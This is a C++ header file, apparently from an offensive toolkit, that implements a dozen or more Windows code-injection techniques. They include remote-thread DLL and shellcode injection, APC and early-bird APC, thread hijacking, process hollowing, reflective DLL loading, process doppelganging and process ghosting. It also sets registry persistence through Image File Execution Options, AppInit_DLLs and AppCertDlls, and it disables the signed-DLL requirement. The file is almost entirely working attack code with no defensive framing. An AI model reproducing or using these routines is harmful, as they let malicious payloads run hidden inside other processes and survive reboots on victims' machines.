#pragma once


#include <iostream>
#include <Windows.h>
//#include <Ntsecapi.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <vector>
#include <string>
#include <DbgHelp.h>
#include <userenv.h>
#include <ktmw32.h>
#include "Utiliti.h"

using namespace std;

#pragma comment(lib, "Dbghelp.lib")
#pragma comment(lib, "Ntdll.lib")
#pragma comment(lib, "Userenv.lib")
#pragma comment(lib, "KtmW32.lib")



DWORD InjectDllUsingCreateRemoteThread(DWORD PID, WCHAR* DllName);
DWORD InjectDllUsingSetWindowHook(WCHAR* DllName, WCHAR* ExportedFunctioName);
DWORD InjectShellCodeInProcess(DWORD PID, WCHAR* ShellCodeFileName);
DWORD InjectUsingAPC(DWORD PID, WCHAR* ShellCodeFileName);
DWORD InjectUsingEarlyBirdAPC(WCHAR* ExecutablePath, WCHAR* ShellCodeFileName);
DWORD InjectUsingTLSCallBack(DWORD PID, WCHAR* ShellCodeFileName , WCHAR* ExecutablePath );
DWORD InjectUsingThreadExecutionHijacking(DWORD PID, WCHAR* ShellCodeFileName);
DWORD InjectUsingProcessHollowing(WCHAR* TargetExecutable, WCHAR* SourceExecutable);
DWORD InjectUsingImageFileExecutionOptions(WCHAR* TargetProcess, WCHAR* SourceProcessToStart);
DWORD InjectUsingAppInit_DLLs(WCHAR* DLLName);
DWORD InjectUsingAppCertDlls(WCHAR* DLLName);
DWORD InjectUsingReflectiveDLLInjection(DWORD PID, WCHAR* DllPath);
DWORD WINAPI InjectUsingProcessDoppelGanging(WCHAR* TargetProcessName, WCHAR* PayloadPath);
DWORD WINAPI InjectUsingProcessGhosting(WCHAR* TargetProcessName, WCHAR* PayloadPath);



DWORD InjectDllUsingCreateRemoteThread(DWORD PID, WCHAR* DllName) {

	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	DWORD Status = NULL;
	LPVOID BaseAddress = NULL;
	DWORD BytesWritten;
	FARPROC LoadDllAddress = NULL;
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (!hProcess) {
		printf("Failed to Open handle to process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}

	BaseAddress = VirtualAllocEx(hProcess, BaseAddress, wcslen(DllName)*2 +2, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!BaseAddress) {
		printf("Failed to Allocate Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}

	Status = WriteProcessMemory(hProcess, BaseAddress, DllName, wcslen(DllName)*2+2, NULL);
	if (!Status) {
		printf("Failed to Write to Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}

	LoadDllAddress = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryW");
	if (!LoadDllAddress) {
		printf("Failed to Get CreateRemoteThread Address Error Code is0x%x\n", GetLastError());
		return -1;
	}

	hThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadDllAddress, BaseAddress, NULL, NULL);
	if (!hThread) {
		printf("Failed to Create Remote Thread in process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}

	return 0;
}

DWORD InjectDllUsingSetWindowHook( WCHAR* DllName, WCHAR* ExportedFunctioName) {

	HMODULE DllBase = LoadLibraryW(DllName);
	if (!DllBase) {
		printf("Failed To Load Dll %S  Error Code is 0x%x\n", DllName, GetLastError());
		return -1;
	}

	wstring FunNameW(ExportedFunctioName);
	string FunNameA(FunNameW.begin(), FunNameW.end());
	HOOKPROC functionAddress = HOOKPROC(GetProcAddress(DllBase, FunNameA.c_str()));
	if (!functionAddress) {
		printf("Failed To Resolve Function address %S  Error Code is 0x%x\n", ExportedFunctioName, GetLastError());
		return -1;
	}

	HHOOK hookHandle = SetWindowsHookExW(WH_KEYBOARD, functionAddress, DllBase, 0);
	if (!functionAddress) {
		printf("Failed To Set Windows Hool  Error Code is 0x%x\n", GetLastError());
		return -1;
	}

	Sleep(10 * 1000);

	UnhookWindowsHookEx(hookHandle);

	return 0;
}

DWORD InjectShellCodeInProcess(DWORD PID, WCHAR* ShellCodeFileName) {

	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	DWORD Status = NULL;
	LPVOID ShelCodeAddress = NULL;
	DWORD BytesWritten;

	BYTE* ShellCode = ReadDataFromFile(ShellCodeFileName);
	if (!ShellCode) {
		return -1;
	}

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (!hProcess) {
		printf("Failed to Open handle to process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}

	ShelCodeAddress = VirtualAllocEx(hProcess, ShelCodeAddress, strlen((const char*)ShellCode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!ShelCodeAddress) {
		printf("Failed to Allocate Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}

	Status = WriteProcessMemory(hProcess, ShelCodeAddress, ShellCode, strlen((const char*)ShellCode), NULL);
	if (!Status) {
		printf("Failed to Write to Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}

	hThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)ShelCodeAddress, NULL, NULL, NULL);
	if (!hThread) {
		printf("Failed to Create Remote Thread in process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}
	return 0;
}

//the ShellCode should handle that it will runs more that once (number of threads in process)
DWORD InjectUsingAPC(DWORD PID, WCHAR* ShellCodeFileName) {
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	DWORD Status = NULL;
	LPVOID ShelCodeAddress = NULL;
	DWORD BytesWritten;
	DWORD TID = -1;
	vector<DWORD> ThreadIds;

	BYTE* ShellCode = ReadDataFromFile(ShellCodeFileName);
	if (!ShellCode) {
		return -1;
	}

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (!hProcess) {
		printf("Failed to Open handle to process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}

	ShelCodeAddress = VirtualAllocEx(hProcess, ShelCodeAddress, strlen((const char*)ShellCode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!ShelCodeAddress) {
		printf("Failed to Allocate Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}

	Status = WriteProcessMemory(hProcess, ShelCodeAddress, ShellCode, strlen((const char*)ShellCode), NULL);
	if (!Status) {
		printf("Failed to Write to Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}

	HANDLE snapshot = CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, 0);
	THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };

	if (Thread32First(snapshot, &threadEntry)) {
		do {
			if (threadEntry.th32OwnerProcessID == PID) {
				ThreadIds.push_back(threadEntry.th32ThreadID);
			}
		} while (Thread32Next(snapshot, &threadEntry));
	}

	// Qeue APC From all threads in the process
	for (DWORD threadId : ThreadIds) {
		HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, TRUE, threadId);
		if (!hThread) {
			printf("Failed to Open handle to Thread TID %d  Error Code is0x%x\n", PID, GetLastError());
			continue;
		}

		Status = QueueUserAPC((PAPCFUNC)ShelCodeAddress, hThread, NULL);
		if (!Status) {
			printf("Failed to Queue APC to Thread Is %d in process PID %d  Error Code is0x%x\n", threadId, PID, GetLastError());
		}

		Sleep(1000 * 2);
		CloseHandle(hThread);
	}
}

DWORD InjectUsingEarlyBirdAPC(WCHAR* ExecutablePath, WCHAR* ShellCodeFileName) {

	PROCESS_INFO ProcInfo;
	DWORD Status = StartExecutable(ExecutablePath, &ProcInfo,CREATE_SUSPENDED);
	if (!Status) {
		return -1;
	}

	Status = InjectUsingAPC(ProcInfo.PID, ShellCodeFileName);

	ResumeProcess(ProcInfo.MainThreadHandle);
	return Status;
}

//TODO If no TLS CallBack in process Create New Section For it
DWORD InjectUsingTLSCallBack(DWORD PID, WCHAR* ShellCodeFileName, WCHAR* ExecutablePath) {
	PROCESS_INFO ProcessInfo;
	DWORD Status = FALSE;
	MODULE_INFO ModuleInfo;
	DWORD dwContinueStatus = DBG_CONTINUE; // exception continuation 
	DEBUG_EVENT DebugEv;

	if (PID != 0) {
		ProcessInfo.MainThreadHandle = NULL;
		ProcessInfo.PID =PID;
	}
	else {
		Status = StartExecutable(ExecutablePath, &ProcessInfo, DEBUG_PROCESS);
		if (!Status) {
			return -1;
		}
	}

	WaitForDebugEvent(&DebugEv, INFINITE);
	ModuleInfo.MainModuleAddress = (BYTE*)DebugEv.u.CreateProcessInfo.lpBaseOfImage;

	BYTE* LocalCopyOfMainModule = new BYTE[500];
	HANDLE hProcess = DebugEv.u.CreateProcessInfo.hProcess;

	Status = ReadProcessMemory(hProcess, ModuleInfo.MainModuleAddress, LocalCopyOfMainModule, 500, 0);
	PIMAGE_DOS_HEADER dosHeader = {};
	PIMAGE_NT_HEADERS imageNTHeaders = {};
	dosHeader = (PIMAGE_DOS_HEADER)LocalCopyOfMainModule;
	imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD)LocalCopyOfMainModule + dosHeader->e_lfanew);
	DWORD Size = imageNTHeaders->OptionalHeader.SizeOfImage;

	ModuleInfo.MainModuleSize = Size;

	/*sleep for 2 second to let the process start
	Sleep(2000);

	GetMainModuleInfo(ProcessInfo.PID, &ModuleInfo);*/

	BYTE* ShellCode = ReadDataFromFile(ShellCodeFileName);
	Status = ChangeTheTLSCallBackFunctionInRemoteProcess(ProcessInfo.PID, &ModuleInfo, ShellCode);
	
	CloseHandle(DebugEv.u.CreateProcessInfo.hFile);
	Status = DebugActiveProcessStop(PID);
	if (!Status) {
		printf("Faile to Deattach From Process Error Code is 0x%x\n", GetLastError());
		Status = -1;
	}
	else Status = 0;

	return Status;
}

DWORD InjectUsingThreadExecutionHijacking(DWORD PID, WCHAR* ShellCodeFileName) {
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	DWORD Status = NULL;
	LPVOID ShelCodeAddress = NULL;
	DWORD BytesWritten;
	BYTE* ShellCode = ReadDataFromFile(ShellCodeFileName);
	if (!ShellCode) {
		return -1;
	}

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (!hProcess) {
		printf("Failed to Open handle to process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}

	ShelCodeAddress = VirtualAllocEx(hProcess, ShelCodeAddress, strlen((const char*)ShellCode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!ShelCodeAddress) {
		printf("Failed to Allocate Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}
	Status = WriteProcessMemory(hProcess, ShelCodeAddress, ShellCode, strlen((const char*)ShellCode), NULL);
	if (!Status) {
		printf("Failed to Write to Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
	CONTEXT ThreadContext;

	memset(&ThreadContext, 0, sizeof(CONTEXT));
	ThreadContext.ContextFlags = CONTEXT_ALL;

	if (Thread32First(snapshot, &threadEntry)) {
		do {
			if (threadEntry.th32OwnerProcessID == PID ) {

				HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, TRUE, threadEntry.th32ThreadID);
				if (!hThread) {
					printf("Failed to Open handle to Thread TID %d  Error Code is0x%x\n", PID, GetLastError());
					continue;
				}
				
				Status = SuspendThread(hThread);
				if (Status ==-1) {
					printf("Failed to Suspend Thread TID %d  Error Code is0x%x\n", PID, GetLastError());
					CloseHandle(hThread);
					continue;
				}
				
				if (GetThreadContext(hThread, &ThreadContext))
				{
					printf("ShellCode addr  %p", ShelCodeAddress);
#if _WIN64			
					ThreadContext.Rip = (DWORD64)ShelCodeAddress;
#else
					ThreadContext.Eip = (DWORD64)ShelCodeAddress;
#endif
					if (!SetThreadContext(hThread, &ThreadContext)) {
						printf("Failed to Set Thread Context to Thread TID %d  Error Code is0x%x\n", PID, GetLastError());
						CloseHandle(hThread);
						continue;
					}
					Status = ResumeThread(hThread);
					if (Status == -1) {
						printf("Failed to Resume Thread TID %d  Error Code is0x%x\n", PID, GetLastError());
						CloseHandle(hThread);
						continue;
					}
					CloseHandle(hThread);
					return 0;
				}

				printf("Failed to Get Thread Context to Thread TID %d  Error Code is0x%x\n", PID, GetLastError());
				CloseHandle(hThread);
			}
			
		} while (Thread32Next(snapshot, &threadEntry));
	}

	return -1;
}

//Crashes With Some 64bit Process (like svchost.exe,...)
DWORD InjectUsingProcessHollowing(WCHAR* TargetExecutable, WCHAR* SourceExecutable)
{
	PROCESS_INFO ProcessInfo;
	DWORD Status = FALSE;

	Status = StartExecutable(TargetExecutable, &ProcessInfo, CREATE_SUSPENDED);
	if (!Status) {
		return -1;
	}
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessInfo.PID);

	PEBmy* pPEB = ReadRemotePEB(hProcess);

	PLOADED_IMAGE pImage = ReadRemoteImage(hProcess, pPEB->ImageBaseAddress);

	BYTE * SourceFileData = ReadDataFromFile(SourceExecutable);

	PLOADED_IMAGE pSourceImage = GetLoadedImage((DWORD64)SourceFileData);

	PIMAGE_NT_HEADERS pSourceHeaders = GetNTHeaders((DWORD64)SourceFileData);

	HMODULE hNTDLL = GetModuleHandleA("ntdll");

	FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");

	_NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection)fpNtUnmapViewOfSection;

	DWORD64 dwResult = NtUnmapViewOfSection(hProcess, pPEB->ImageBaseAddress);
	if (dwResult)
	{
		printf("Error unmapping section 0x%x\r\n",GetLastError());
		return -1;
	}

	PVOID pRemoteImage = VirtualAllocEx(hProcess, pPEB->ImageBaseAddress, pSourceHeaders->OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!pRemoteImage)
	{
		printf("VirtualAllocEx call failed 0x%x\r\n",GetLastError());
		return -1;
	}

	DWORD64 dwDelta = (DWORD64)pPEB->ImageBaseAddress - pSourceHeaders->OptionalHeader.ImageBase;

	pSourceHeaders->OptionalHeader.ImageBase = (DWORD64)pPEB->ImageBaseAddress;

	if (!WriteProcessMemory(hProcess, pPEB->ImageBaseAddress, SourceFileData, pSourceHeaders->OptionalHeader.SizeOfHeaders, 0)) {
		printf("Error writing process memory 0x%x\r\n", GetLastError());

		return -1;
	}

	for (DWORD64 x = 0; x < pSourceImage->NumberOfSections; x++)
	{
		if (!pSourceImage->Sections[x].PointerToRawData)
			continue;

		PVOID pSectionDestination = (PVOID)((DWORD64)pPEB->ImageBaseAddress + pSourceImage->Sections[x].VirtualAddress);

		if (!WriteProcessMemory(hProcess, pSectionDestination, &SourceFileData[pSourceImage->Sections[x].PointerToRawData], 
								pSourceImage->Sections[x].SizeOfRawData, 0)) 
		{
			printf("Error writing process memory 0x%x\r\n", GetLastError());
			return -1;
		}
	}

	if (dwDelta)
		for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
		{
			char pSectionName[] = ".reloc";

			if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName)))
				continue;

			DWORD64 dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
			DWORD dwOffset = 0;

			IMAGE_DATA_DIRECTORY relocData = pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

			while (dwOffset < relocData.Size)
			{
				PBASE_RELOCATION_BLOCK pBlockheader = (PBASE_RELOCATION_BLOCK)&SourceFileData[dwRelocAddr + dwOffset];

				dwOffset += sizeof(BASE_RELOCATION_BLOCK);

				DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);

				PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY)&SourceFileData[dwRelocAddr + dwOffset];

				for (DWORD y = 0; y < dwEntryCount; y++)
				{
					dwOffset += sizeof(BASE_RELOCATION_ENTRY);

					if (pBlocks[y].Type == 0)
						continue;

					DWORD dwFieldAddress =
						pBlockheader->PageAddress + pBlocks[y].Offset;

					DWORD64 dwBuffer = 0;
					BOOL bSuccess;
					bSuccess = ReadProcessMemory(hProcess, (PVOID)((DWORD64)pPEB->ImageBaseAddress + dwFieldAddress),
												&dwBuffer, sizeof(DWORD64), 0);
					if (!bSuccess)
					{
						printf("Error reading memory  0x%x\r\n", GetLastError());
						continue;

					}
					dwBuffer += dwDelta;
					bSuccess = WriteProcessMemory(hProcess, (LPVOID)((DWORD64)pPEB->ImageBaseAddress + dwFieldAddress),
												&dwBuffer, sizeof(DWORD64), 0);
				
					if (!bSuccess) {
						printf("Error writing memory  0x%x\r\n", GetLastError());
						continue;
					}
				}
			}

			break;
		}

	//DWORD64 dwEntrypoint = CopyAndFixRelocationForPEfileToRemoteProcess(hProcess, (DWORD64)pPEB->ImageBaseAddress, SourceFileData);

	DWORD64 dwEntrypoint = (DWORD64)pPEB->ImageBaseAddress + pSourceHeaders->OptionalHeader.AddressOfEntryPoint;

	LPCONTEXT pContext = new CONTEXT();
	pContext->ContextFlags = CONTEXT_FULL;

	if (!GetThreadContext(ProcessInfo.MainThreadHandle, pContext))
	{
		printf("Error getting context Erro Code 0x%x\r\n",GetLastError());
		return -1;
	}
#if _WIN64			
	pContext->Rcx = (DWORD64)dwEntrypoint;
#else
	pContext->Eax = dwEntrypoint;
#endif

	if (!SetThreadContext(ProcessInfo.MainThreadHandle, pContext))
	{
		printf("Error setting context Error Code 0x%x\r\n",GetLastError());
		return -1;
	}

	if (!ResumeThread(ProcessInfo.MainThreadHandle))
	{
		printf("Error resuming thread Error Code 0x%x\r\n",GetLastError());
		return -1;
	}

	return 0;
}


//Persestance
DWORD InjectUsingImageFileExecutionOptions(WCHAR* TargetProcess, WCHAR* SourceProcessToStart) {

	BOOL Status = 0;
	wstring RegAddCommand = L"reg add ";
	wstring KEY = L"\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\";
	wstring wsTargetProcess = TargetProcess;
	wstring wsSourceProcessToStart = SourceProcessToStart;
	wstring CmdCommand = L"C:\\WINDOWS\\System32\\cmd.exe /c " + RegAddCommand + KEY + wsTargetProcess + L"\"" + L" /v GlobalFlag /t REG_DWORD /d 512";

	PROCESS_INFO info;
	Status = StartExecutable((WCHAR*)CmdCommand.c_str(), &info, NULL);
	if (!Status) {
		return -1;
	}

	CmdCommand = L"";
	
	CmdCommand = L"C:\\WINDOWS\\System32\\cmd.exe /c " + RegAddCommand + KEY + wsTargetProcess + L"\"" + L" /v Debugger /t REG_SZ /d " + wsSourceProcessToStart;
	Status = StartExecutable((WCHAR*)CmdCommand.c_str(), &info, NULL);
	if (!Status) {
		return -1;
	}

	return 0;
}

//Does not work When Secure Boot is ON
DWORD InjectUsingAppInit_DLLs(WCHAR* DLLName) {

	BOOL Status = 0;
	PROCESS_INFO info;

	wstring RegAddCommand = L"reg add ";
	wstring KEY = L"\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows";
	wstring wsDLLName = DLLName;

	wstring CmdCommand = L"C:\\WINDOWS\\System32\\cmd.exe /c " + RegAddCommand + KEY  + L"\"" + L" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f";

	Status = StartExecutable((WCHAR*)CmdCommand.c_str(), &info, NULL);
	if (!Status) {
		return -1;
	}

	CmdCommand = L"";

	CmdCommand = L"C:\\WINDOWS\\System32\\cmd.exe /c " + RegAddCommand + KEY  + L"\"" + L" /v AppInit_DLLs /t REG_SZ /d " + wsDLLName + L" /f";

	Status = StartExecutable((WCHAR*)CmdCommand.c_str(), &info, NULL);
	if (!Status) {
		return -1;
	}

	CmdCommand = L"";

	CmdCommand = L"C:\\WINDOWS\\System32\\cmd.exe /c " + RegAddCommand + KEY + L"\"" + L" /v RequireSignedAppInit_DLLs /t REG_DWORD /d 0 /f";

	Status = StartExecutable((WCHAR*)CmdCommand.c_str(), &info, NULL);
	if (!Status) {
		return -1;
	}
	return 0;
}

DWORD InjectUsingAppCertDlls(WCHAR* DLLName) {

	BOOL Status = 0;
	PROCESS_INFO info;

	wstring RegAddCommand = L"reg add ";
	wstring KEY = L"\"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls";
	wstring wsDLLName = DLLName;

	wstring CmdCommand = L"C:\\WINDOWS\\System32\\cmd.exe /c " + RegAddCommand + KEY + L"\"" + L" /v AppCert.dll /t REG_SZ /d " + wsDLLName + L" /f";

	Status = StartExecutable((WCHAR*)CmdCommand.c_str(), &info, NULL);
	if (!Status) {
		return -1;
	}

	return 0;
}

// can inject 64bit in 64bit, 64bit in 32bit but 32bit in 32bit work only on 32bit windows
DWORD WINAPI InjectUsingProcessGhosting(WCHAR* TargetProcessName, WCHAR* PayloadPath) {

	HMODULE hNTDLL = GetModuleHandleA("ntdll");
	_NtCreateProcessEx fnNtCreateProcessEx = (_NtCreateProcessEx)GetProcAddress(hNTDLL, "NtCreateProcessEx");
	_NtCreateThreadEx fnNtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
	_NtQueryInformationProcess fnNtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(hNTDLL, "NtQueryInformationProcess");

	BYTE* PayloadData = ReadDataFromFile(PayloadPath);

	DWORD PayloadSize = GetSizeOfFile(PayloadPath);

	WCHAR DummyName[MAX_PATH] = { 0 };
	WCHAR TempPath[MAX_PATH] = { 0 };
	DWORD size = GetTempPathW(MAX_PATH, TempPath);
	GetTempFileNameW(TempPath, L"TH", 0, DummyName);

	HANDLE hSection = GetSectionHandleFromFileThenDeleteFileOnClose(DummyName, PayloadData, PayloadSize);
	if (!hSection || hSection == INVALID_HANDLE_VALUE) {
		return -1;
	}
	
	DWORD Status = CreateProcessFromSecion(hSection, PayloadData, TargetProcessName);
	if (Status == -1) {
		return -1;
	}

	return 0;

}

// your Dll Should Depend on Kernel32 and ntdll.dll only (for stability, you can resolve all the API you need using GetProcAddress and LoadLibrary)
DWORD InjectUsingReflectiveDLLInjection(DWORD PID, WCHAR* DllPath) {
	HANDLE hFile = NULL;
	DWORD Status = NULL;
	HANDLE hProcess = NULL;
	HANDLE hToken = NULL;
	LPVOID lpBuffer = NULL;
	DWORD dwLength = 0;
	DWORD dwBytesRead = 0;
	DWORD dwProcessId = PID;

	hFile = CreateFile(DllPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("Failed to open the DLL file  Error Code %x\n", GetLastError());
		return -1;
	}

	dwLength = GetFileSize(hFile, NULL);
	if (dwLength == INVALID_FILE_SIZE || dwLength == 0) {
		printf("Failed to get the DLL file size  Error Code %x\n", GetLastError());
	}

	lpBuffer = HeapAlloc(GetProcessHeap(), 0, dwLength);
	if (!lpBuffer) {
		printf("Failed to get the DLL file size  Error Code %x\n", GetLastError());
		return -1;
	}

	if (ReadFile(hFile, lpBuffer, dwLength, &dwBytesRead, NULL) == FALSE) {
		printf("Failed to alloc a buffer!");
		return -1;
	}

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
	if (!hProcess) {
		printf("Failed to open the target process  Error Code %x\n", GetLastError());
		return -1;
	}

	Status = LoadRemoteLibraryR(hProcess, (BYTE*)lpBuffer, NULL);
	if (Status == -1) {
		return -1;
	}

	//WaitForSingleObject(hModule, -1);

	if (lpBuffer)
		HeapFree(GetProcessHeap(), 0, lpBuffer);

	if (hProcess)
		CloseHandle(hProcess);

	return 0;
}

DWORD WINAPI InjectUsingProcessDoppelGanging(WCHAR* TargetProcessName, WCHAR* PayloadPath) {

	BYTE* PayloadData = ReadDataFromFile(PayloadPath);

	DWORD PayloadSize = GetSizeOfFile(PayloadPath);

	HANDLE hSection = MakeTransactedSection(TargetProcessName, PayloadData, PayloadSize);
	if (!hSection || hSection == INVALID_HANDLE_VALUE) {
		return -1;
	}
	DWORD Status = CreateProcessFromSecion(hSection, PayloadData, TargetProcessName);
	if (Status == -1) {
		return -1;
	}

	return 0;
}